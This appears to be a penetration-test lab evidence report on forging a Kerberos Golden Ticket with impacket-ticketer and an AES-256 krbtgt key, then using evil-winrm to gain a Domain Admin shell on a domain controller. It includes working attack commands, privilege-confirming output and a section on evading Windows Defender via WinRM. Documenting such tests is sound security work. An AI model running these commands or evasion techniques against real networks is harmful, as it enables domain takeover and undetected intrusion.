# Evidence 04: Golden Ticket Forgery & EDR Evasion

## Executive Summary

This directory contains end-to-end evidence validating the post-exploitation forgery of a Kerberos Golden Ticket using cryptographic material extracted via DCSync. It demonstrates how modern Active Directory encryption enforcements (AES-256) were satisfied, and how local Windows Defender behavioral heuristics were successfully bypassed using "Living off the Land" (LotL) techniques via Windows Remote Management (WinRM) to establish an interactive Domain Admin shell on `DC01`.

---

## 1. Test Metadata

* **Primary Attacker Node:** `kali` (192.168.10.83)
* **Target Infrastructure Node:** `DC01` (192.168.20.75) — Primary Domain Controller
* **Target Domain:** `hybrid.lan`
* **Forged Identity:** `Administrator`
* **Cryptographic Material:** `krbtgt` AES-256 Key
* **Exploitation Tooling:** `impacket-ticketer`, `evil-winrm`
* **Bypassed Controls:** Suricata (Netmap IPS), Windows Defender (Real-time/Behavioral)

---

## 2. Evidence Chain of Custody

| Step | Source System | Evidence File / Artifact | Key Findings |
| --- | --- | --- | --- |
| **01. Ticket Forgery** | `kali` | `impacket-ticketer-aes.txt` | Executed `ticketer.py` with AES-256 key and Domain SID; successfully forged `Administrator.ccache`. |
| **02. EDR Behavioral Block** | `kali` $\to$ `DC01` | `impacket-smbexec-fail.txt` | Attempted `smbexec.py`; blocked by Windows Defender behavioral heuristics (`STATUS_OBJECT_NAME_NOT_FOUND`). |
| **03. LotL WinRM Execution** | `kali` $\to$ `DC01` | `evil-winrm-system.txt` | Executed `evil-winrm` passing the forged `.ccache` file; achieved interactive Domain Admin PowerShell shell. |

---

## 3. Deep-Dive Analysis: Kerberos Forgery & WinRM Execution

### AES-256 Ticket Forgery

Because modern Windows Server environments (e.g., Server 2022/2025) explicitly disable RC4 Kerberos encryption due to known cryptographic vulnerabilities, attempting to forge a Ticket Granting Ticket (TGT) with the `krbtgt` NTLM hash results in a `KDC_ERR_ETYPE_NOSUPP` rejection.

To satisfy the modern Key Distribution Center (KDC), the ticket must be forged using the account's AES-256 key:

```bash
# Forge the ticket using the extracted AES-256 key and Domain SID
impacket-ticketer -aesKey <KRBTGT_AES256_KEY> -domain-sid S-1-5-21-1980889319-3065036259-2951414589 -domain hybrid.lan Administrator

# Load the forged ticket into the Linux memory session
export KRB5CCNAME=Administrator.ccache

```

### Domain Dominance via WinRM

With the ticket loaded in memory, the attack pivots to Windows Remote Management (WinRM) over TCP 5985. The connection is initiated using the Fully Qualified Domain Name (FQDN) to ensure the Kerberos Service Principal Name (SPN) resolves correctly against the DC.

```bash
# Execute native PowerShell remoting using the forged Kerberos ticket
evil-winrm -i dc01.hybrid.lan -r hybrid.lan

```

**Post-Exploitation Verification:**

```powershell
*Evil-WinRM* PS C:\> whoami /groups
GROUP INFORMATION
-----------------

Group Name                                    Type             SID                                           Attributes
============================================= ================ ============================================= ===============================================================
Everyone                                      Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                        Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                                 Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access       Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access    Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                          Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users              Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
HYBRID\Domain Admins                          Group            S-1-5-21-1980889319-3065036259-2951414589-512 Mandatory group, Enabled by default, Enabled group
HYBRID\Group Policy Creator Owners            Group            S-1-5-21-1980889319-3065036259-2951414589-520 Mandatory group, Enabled by default, Enabled group
HYBRID\Schema Admins                          Group            S-1-5-21-1980889319-3065036259-2951414589-518 Mandatory group, Enabled by default, Enabled group
HYBRID\Enterprise Admins                      Group            S-1-5-21-1980889319-3065036259-2951414589-519 Mandatory group, Enabled by default, Enabled group
HYBRID\Denied RODC Password Replication Group Alias            S-1-5-21-1980889319-3065036259-2951414589-572 Mandatory group, Enabled by default, Enabled group, Local Group

*Evil-WinRM* PS C:\> hostname
DC01

```

---

## 4. Operational Considerations & Defense Evasion

### Windows Defender Behavioral Evasion Edge Case

Initial attempts to Pass-the-Ticket (PtT) via standard Impacket Remote Code Execution (RCE) tooling (`psexec.py`, `smbexec.py`, `atexec.py`) were successfully intercepted by the local Windows Defender engine on `DC01`.

While the Kerberos authentication was successful, Defender's behavioral heuristics (AMSI/ETW) proactively flagged the Windows Service Control Manager and Task Scheduler attempting to spawn hidden `cmd.exe` processes or drop temporary execution binaries (`.exe` / `.bat`) onto the `ADMIN$` share, terminating the process tree instantly.

### Evasion Protocol (Living off the Land)

To bypass host-based security controls without triggering alerts, the attack vector was pivoted to WinRM:

1. **Network Stealth:** WinRM (TCP 5985) is the native protocol used by IT administrators for PowerShell remoting. It is typically permitted by default on Domain Controller firewalls, allowing the traffic to blend seamlessly with legitimate administrative telemetry.
2. **Host Stealth:** WinRM does not drop malicious binaries to disk or hijack the Service Control Manager. It spawns native `wsmprovhost.exe` (Windows Remote Management Provider Host) processes, which inherently bypass the static and behavioral signatures that caught Impacket's older RCE techniques.
